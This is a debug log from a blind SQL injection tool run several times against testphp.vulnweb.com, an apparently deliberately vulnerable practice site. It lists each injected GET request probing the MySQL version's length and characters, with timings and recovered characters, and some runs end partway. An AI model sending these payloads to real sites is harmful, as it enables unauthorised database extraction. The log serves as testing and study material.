2015-11-30 03:03:49,800 DEBUG      Set Logging mode is True.
2015-11-30 03:03:49,800 INFO       Try to load: blind_sql_injection.
2015-11-30 03:03:49,802 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection.
2015-11-30 03:03:49,802 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:03:49,802 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:03:49,802 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:03:49,802 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:03:49,802 DEBUG      Found 1 inject point in URL
2015-11-30 03:03:49,803 DEBUG      Set inject point to: URL
2015-11-30 03:03:49,803 WARNING    Inject point is ready.
2015-11-30 03:03:49,803 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:03:49,803 INFO       Get MySQL version
2015-11-30 03:03:49,808 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:03:49,808 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=0.
2015-11-30 03:03:49,808 DEBUG      Cookie: None.
2015-11-30 03:03:50,866 DEBUG      Time: 1.05806803703.
2015-11-30 03:03:50,867 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:03:50,868 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=1.
2015-11-30 03:03:50,868 DEBUG      Cookie: None.
2015-11-30 03:03:51,923 DEBUG      Time: 1.05462288857.
2015-11-30 03:03:51,923 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:03:51,924 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=2.
2015-11-30 03:03:51,924 DEBUG      Cookie: None.
2015-11-30 03:03:52,951 DEBUG      Time: 1.0266430378.
2015-11-30 03:03:52,951 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:03:52,952 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=3.
2015-11-30 03:03:52,952 DEBUG      Cookie: None.
2015-11-30 03:03:53,966 DEBUG      Time: 1.01357483864.
2015-11-30 03:03:53,966 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:03:53,967 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=4.
2015-11-30 03:03:53,967 DEBUG      Cookie: None.
2015-11-30 03:03:54,987 DEBUG      Time: 1.0204410553.
2015-11-30 03:03:54,988 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:03:54,988 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=5.
2015-11-30 03:03:54,988 DEBUG      Cookie: None.
2015-11-30 03:03:56,015 DEBUG      Time: 1.02653217316.
2015-11-30 03:03:56,016 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:03:56,016 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=6.
2015-11-30 03:03:56,016 DEBUG      Cookie: None.
2015-11-30 03:03:57,045 DEBUG      Time: 1.02902197838.
2015-11-30 03:03:57,046 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:03:57,046 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=7.
2015-11-30 03:03:57,046 DEBUG      Cookie: None.
2015-11-30 03:03:58,055 DEBUG      Time: 1.00792002678.
2015-11-30 03:03:58,055 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:03:58,055 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=8.
2015-11-30 03:03:58,056 DEBUG      Cookie: None.
2015-11-30 03:03:59,077 DEBUG      Time: 1.02154016495.
2015-11-30 03:03:59,078 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:03:59,078 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=9.
2015-11-30 03:03:59,078 DEBUG      Cookie: None.
2015-11-30 03:04:00,092 DEBUG      Time: 1.01296520233.
2015-11-30 03:04:00,096 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:04:00,096 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=10.
2015-11-30 03:04:00,096 DEBUG      Cookie: None.
2015-11-30 03:04:01,136 DEBUG      Time: 1.03986001015.
2015-11-30 03:04:01,137 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:04:01,137 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=11.
2015-11-30 03:04:01,137 DEBUG      Cookie: None.
2015-11-30 03:04:02,188 DEBUG      Time: 1.05041694641.
2015-11-30 03:04:02,189 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:04:02,189 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=12.
2015-11-30 03:04:02,189 DEBUG      Cookie: None.
2015-11-30 03:04:03,223 DEBUG      Time: 1.0333969593.
2015-11-30 03:04:03,223 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:04:03,224 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=13.
2015-11-30 03:04:03,224 DEBUG      Cookie: None.
2015-11-30 03:04:04,247 DEBUG      Time: 1.02319908142.
2015-11-30 03:04:04,248 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:04:04,248 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=14.
2015-11-30 03:04:04,248 DEBUG      Cookie: None.
2015-11-30 03:04:05,296 DEBUG      Time: 1.04789113998.
2015-11-30 03:04:05,298 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:04:05,298 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:04:05,298 DEBUG      Cookie: None.
2015-11-30 03:04:06,321 DEBUG      Time: 1.02253913879.
2015-11-30 03:04:06,322 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:04:06,322 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=16.
2015-11-30 03:04:06,322 DEBUG      Cookie: None.
2015-11-30 03:04:06,514 INFO       Finish load module: exploit/sql_injection/blind_sql_injection.
2015-11-30 03:09:51,968 INFO       Try to load: blind_sql_injection.
2015-11-30 03:09:51,969 WARNING    Inject point is ready.
2015-11-30 03:09:51,969 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:09:51,970 INFO       Get MySQL version
2015-11-30 03:09:51,970 INFO       Run query: version()
2015-11-30 03:10:16,753 INFO       Result length: 23
2015-11-30 03:10:22,910 INFO       Found character number 1 is: 5.
2015-11-30 03:11:41,203 INFO       Found character number 2 is: ..
2015-11-30 03:11:43,288 INFO       Found character number 3 is: 1.
2015-11-30 03:13:01,293 INFO       Found character number 4 is: ..
2015-11-30 03:13:09,539 INFO       Found character number 5 is: 7.
2015-11-30 03:13:13,682 INFO       Found character number 6 is: 3.
2015-11-30 03:14:30,838 INFO       Found character number 7 is: -.
2015-11-30 03:14:31,876 INFO       Found character number 8 is: 0.
2015-11-30 03:15:03,782 INFO       Found character number 9 is: u.
2015-11-30 03:15:16,233 INFO       Found character number 10 is: b.
2015-11-30 03:15:48,287 INFO       Found character number 11 is: u.
2015-11-30 03:16:12,975 INFO       Found character number 12 is: n.
2015-11-30 03:16:43,567 INFO       Found character number 13 is: t.
2015-11-30 03:17:15,512 INFO       Found character number 14 is: u.
2015-11-30 03:17:16,555 INFO       Found character number 15 is: 0.
2015-11-30 03:18:30,914 INFO       Finish load module: exploit/sql_injection/blind_sql_injection.
2015-11-30 03:31:18,808 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:31:18,812 WARNING    Inject point is ready.
2015-11-30 03:31:18,812 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:31:18,812 INFO       Get MySQL version
2015-11-30 03:31:18,812 INFO       Run query: version()
2015-11-30 03:31:18,812 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:31:34,482 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:31:34,486 WARNING    Inject point is ready.
2015-11-30 03:31:34,487 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:31:34,487 INFO       Get MySQL version
2015-11-30 03:31:34,487 INFO       Run query: version()
2015-11-30 03:31:37,217 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:31:39,631 DEBUG      Set Logging mode is True.
2015-11-30 03:31:39,631 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:31:39,635 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:31:39,635 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:31:39,635 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:31:39,635 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:31:39,635 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:31:39,635 DEBUG      Found 1 inject point in URL
2015-11-30 03:31:39,635 DEBUG      Set inject point to: URL
2015-11-30 03:31:39,636 WARNING    Inject point is ready.
2015-11-30 03:31:39,636 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:31:39,636 INFO       Get MySQL version
2015-11-30 03:31:39,636 INFO       Run query: version()
2015-11-30 03:31:39,641 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:31:39,641 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:31:39,641 DEBUG      Cookie: None.
2015-11-30 03:31:40,647 DEBUG      Time: 1.00650382042.
2015-11-30 03:31:40,648 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:31:40,649 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:31:40,649 DEBUG      Cookie: None.
2015-11-30 03:31:41,674 DEBUG      Time: 1.024944067.
2015-11-30 03:31:41,675 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:31:41,675 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:31:41,675 DEBUG      Cookie: None.
2015-11-30 03:31:42,669 DEBUG      Time: 0.993960142136.
2015-11-30 03:31:42,670 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:31:42,670 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:31:42,670 DEBUG      Cookie: None.
2015-11-30 03:31:43,696 DEBUG      Time: 1.02538180351.
2015-11-30 03:31:43,697 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:31:43,697 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:31:43,697 DEBUG      Cookie: None.
2015-11-30 03:31:44,743 DEBUG      Time: 1.04609799385.
2015-11-30 03:31:44,745 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:31:44,745 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:31:44,745 DEBUG      Cookie: None.
2015-11-30 03:31:45,793 DEBUG      Time: 1.04748296738.
2015-11-30 03:31:45,794 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:31:45,794 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:31:45,794 DEBUG      Cookie: None.
2015-11-30 03:31:46,813 DEBUG      Time: 1.01845693588.
2015-11-30 03:31:46,813 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:31:46,814 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:31:46,814 DEBUG      Cookie: None.
2015-11-30 03:31:47,840 DEBUG      Time: 1.02632403374.
2015-11-30 03:31:47,841 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:31:47,841 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:47,841 DEBUG      Cookie: None.
2015-11-30 03:31:48,855 DEBUG      Time: 1.01389217377.
2015-11-30 03:31:48,856 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:31:48,856 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:48,857 DEBUG      Cookie: None.
2015-11-30 03:31:49,888 DEBUG      Time: 1.03125309944.
2015-11-30 03:31:49,890 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:31:49,890 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:49,890 DEBUG      Cookie: None.
2015-11-30 03:31:50,928 DEBUG      Time: 1.0373339653.
2015-11-30 03:31:50,929 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:31:50,929 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:50,929 DEBUG      Cookie: None.
2015-11-30 03:31:51,937 DEBUG      Time: 1.00804615021.
2015-11-30 03:31:51,938 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:31:51,938 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:51,938 DEBUG      Cookie: None.
2015-11-30 03:31:52,988 DEBUG      Time: 1.04940605164.
2015-11-30 03:31:52,989 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:31:52,989 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:52,989 DEBUG      Cookie: None.
2015-11-30 03:31:54,037 DEBUG      Time: 1.04850912094.
2015-11-30 03:31:54,038 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:31:54,038 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:54,039 DEBUG      Cookie: None.
2015-11-30 03:31:55,046 DEBUG      Time: 1.00704598427.
2015-11-30 03:31:55,047 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:31:55,047 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:55,047 DEBUG      Cookie: None.
2015-11-30 03:31:56,067 DEBUG      Time: 1.02026510239.
2015-11-30 03:31:56,068 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:31:56,068 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:56,069 DEBUG      Cookie: None.
2015-11-30 03:31:57,121 DEBUG      Time: 1.05242013931.
2015-11-30 03:31:57,122 DEBUG      Send GET request number 18 to testphp.vulnweb.com.
2015-11-30 03:31:57,122 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:57,122 DEBUG      Cookie: None.
2015-11-30 03:31:58,128 DEBUG      Time: 1.00587415695.
2015-11-30 03:31:58,129 DEBUG      Send GET request number 19 to testphp.vulnweb.com.
2015-11-30 03:31:58,129 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:58,129 DEBUG      Cookie: None.
2015-11-30 03:31:59,143 DEBUG      Time: 1.01332306862.
2015-11-30 03:31:59,144 DEBUG      Send GET request number 20 to testphp.vulnweb.com.
2015-11-30 03:31:59,144 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:31:59,144 DEBUG      Cookie: None.
2015-11-30 03:32:00,160 DEBUG      Time: 1.01587414742.
2015-11-30 03:32:00,162 DEBUG      Send GET request number 21 to testphp.vulnweb.com.
2015-11-30 03:32:00,162 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:32:00,162 DEBUG      Cookie: None.
2015-11-30 03:32:00,881 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:32:22,699 DEBUG      Set Logging mode is True.
2015-11-30 03:32:22,699 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:32:22,703 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:32:22,703 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:32:22,703 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:32:22,704 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:32:22,704 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:32:22,704 DEBUG      Found 1 inject point in URL
2015-11-30 03:32:22,704 DEBUG      Set inject point to: URL
2015-11-30 03:32:22,704 WARNING    Inject point is ready.
2015-11-30 03:32:22,704 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:32:22,704 INFO       Get MySQL version
2015-11-30 03:32:22,705 INFO       Run query: version()
2015-11-30 03:32:22,709 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:32:22,709 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:32:22,710 DEBUG      Cookie: None.
2015-11-30 03:32:23,730 DEBUG      Time: 1.02046608925.
2015-11-30 03:32:23,731 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:32:23,731 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:32:23,732 DEBUG      Cookie: None.
2015-11-30 03:32:24,770 DEBUG      Time: 1.03857088089.
2015-11-30 03:32:24,773 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:32:24,773 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:32:24,773 DEBUG      Cookie: None.
2015-11-30 03:32:25,799 DEBUG      Time: 1.02496194839.
2015-11-30 03:32:25,799 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:32:25,800 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:32:25,800 DEBUG      Cookie: None.
2015-11-30 03:32:26,847 DEBUG      Time: 1.04721903801.
2015-11-30 03:32:26,848 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:32:26,848 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:32:26,848 DEBUG      Cookie: None.
2015-11-30 03:32:27,899 DEBUG      Time: 1.05010700226.
2015-11-30 03:32:27,899 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:32:27,899 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:32:27,900 DEBUG      Cookie: None.
2015-11-30 03:32:28,953 DEBUG      Time: 1.05270195007.
2015-11-30 03:32:28,953 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:32:28,954 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:32:28,954 DEBUG      Cookie: None.
2015-11-30 03:32:29,967 DEBUG      Time: 1.01344299316.
2015-11-30 03:32:29,968 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:32:29,968 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:32:29,968 DEBUG      Cookie: None.
2015-11-30 03:32:30,962 DEBUG      Time: 0.992974042892.
2015-11-30 03:32:30,962 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:32:30,963 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:32:30,963 DEBUG      Cookie: None.
2015-11-30 03:32:32,014 DEBUG      Time: 1.0514550209.
2015-11-30 03:32:32,015 INFO       Result length: 23
2015-11-30 03:32:32,015 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:32:32,015 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=48.
2015-11-30 03:32:32,016 DEBUG      Cookie: None.
2015-11-30 03:32:33,064 DEBUG      Time: 1.04786801338.
2015-11-30 03:32:33,065 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:32:33,065 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=49.
2015-11-30 03:32:33,065 DEBUG      Cookie: None.
2015-11-30 03:32:34,112 DEBUG      Time: 1.04737114906.
2015-11-30 03:32:34,113 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:32:34,113 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=50.
2015-11-30 03:32:34,114 DEBUG      Cookie: None.
2015-11-30 03:32:35,184 DEBUG      Time: 1.07020998001.
2015-11-30 03:32:35,186 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:32:35,186 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=51.
2015-11-30 03:32:35,186 DEBUG      Cookie: None.
2015-11-30 03:32:36,224 DEBUG      Time: 1.03838682175.
2015-11-30 03:32:36,225 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:32:36,225 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=52.
2015-11-30 03:32:36,226 DEBUG      Cookie: None.
2015-11-30 03:32:37,240 DEBUG      Time: 1.0137720108.
2015-11-30 03:32:37,240 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:32:37,241 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=53.
2015-11-30 03:32:37,241 DEBUG      Cookie: None.
2015-11-30 03:32:38,291 DEBUG      Time: 1.05008602142.
2015-11-30 03:32:38,291 INFO       Found character number 1 is: 5.
2015-11-30 03:32:38,292 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:32:38,292 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=48.
2015-11-30 03:32:38,292 DEBUG      Cookie: None.
2015-11-30 03:32:39,325 DEBUG      Time: 1.03229999542.
2015-11-30 03:32:39,326 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:32:39,326 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=49.
2015-11-30 03:32:39,326 DEBUG      Cookie: None.
2015-11-30 03:32:39,401 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:39:07,771 DEBUG      Set Logging mode is True.
2015-11-30 03:39:07,771 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:39:07,775 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:39:07,775 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:39:07,776 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:39:07,776 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:39:07,776 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:39:07,776 DEBUG      Found 1 inject point in URL
2015-11-30 03:39:07,776 DEBUG      Set inject point to: URL
2015-11-30 03:39:07,776 WARNING    Inject point is ready.
2015-11-30 03:39:07,776 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:39:07,777 INFO       Get MySQL version
2015-11-30 03:39:07,777 INFO       Run query: version()
2015-11-30 03:39:07,782 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:39:07,782 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:39:07,782 DEBUG      Cookie: None.
2015-11-30 03:39:08,827 DEBUG      Time: 1.04491615295.
2015-11-30 03:39:08,828 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:39:08,828 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:39:08,828 DEBUG      Cookie: None.
2015-11-30 03:39:09,832 DEBUG      Time: 1.00317406654.
2015-11-30 03:39:09,832 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:39:09,833 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:39:09,833 DEBUG      Cookie: None.
2015-11-30 03:39:10,855 DEBUG      Time: 1.02200317383.
2015-11-30 03:39:10,856 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:39:10,856 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:39:10,856 DEBUG      Cookie: None.
2015-11-30 03:39:11,902 DEBUG      Time: 1.04591989517.
2015-11-30 03:39:11,903 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:39:11,903 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:39:11,903 DEBUG      Cookie: None.
2015-11-30 03:39:12,949 DEBUG      Time: 1.04561209679.
2015-11-30 03:39:12,952 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:39:12,952 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:39:12,952 DEBUG      Cookie: None.
2015-11-30 03:39:13,992 DEBUG      Time: 1.04000091553.
2015-11-30 03:39:13,993 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:39:13,993 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:39:13,993 DEBUG      Cookie: None.
2015-11-30 03:39:15,032 DEBUG      Time: 1.03856897354.
2015-11-30 03:39:15,033 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:39:15,033 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:39:15,033 DEBUG      Cookie: None.
2015-11-30 03:39:16,058 DEBUG      Time: 1.02428007126.
2015-11-30 03:39:16,058 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:39:16,059 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:39:16,059 DEBUG      Cookie: None.
2015-11-30 03:39:17,085 DEBUG      Time: 1.02644491196.
2015-11-30 03:39:17,086 INFO       Result length: 23
2015-11-30 03:39:17,086 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:39:17,086 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=127.
2015-11-30 03:39:17,087 DEBUG      Cookie: None.
2015-11-30 03:39:18,118 DEBUG      Time: 1.0308971405.
2015-11-30 03:39:18,118 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:39:18,119 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),1,1)).
2015-11-30 03:39:18,119 DEBUG      Cookie: None.
2015-11-30 03:39:19,139 DEBUG      Time: 1.02012610435.
2015-11-30 03:39:19,140 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:39:19,140 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=63.
2015-11-30 03:39:19,140 DEBUG      Cookie: None.
2015-11-30 03:39:20,154 DEBUG      Time: 1.01313114166.
2015-11-30 03:39:20,154 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:39:20,155 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),1,1)).
2015-11-30 03:39:20,155 DEBUG      Cookie: None.
2015-11-30 03:39:21,192 DEBUG      Time: 1.03688979149.
2015-11-30 03:39:21,193 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:39:21,193 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=31.
2015-11-30 03:39:21,193 DEBUG      Cookie: None.
2015-11-30 03:39:22,212 DEBUG      Time: 1.01856684685.
2015-11-30 03:39:22,212 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:39:22,213 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),1,1)).
2015-11-30 03:39:22,213 DEBUG      Cookie: None.
2015-11-30 03:39:23,234 DEBUG      Time: 1.02077388763.
2015-11-30 03:39:23,235 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:39:23,236 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=47.
2015-11-30 03:39:23,236 DEBUG      Cookie: None.
2015-11-30 03:39:24,262 DEBUG      Time: 1.02558803558.
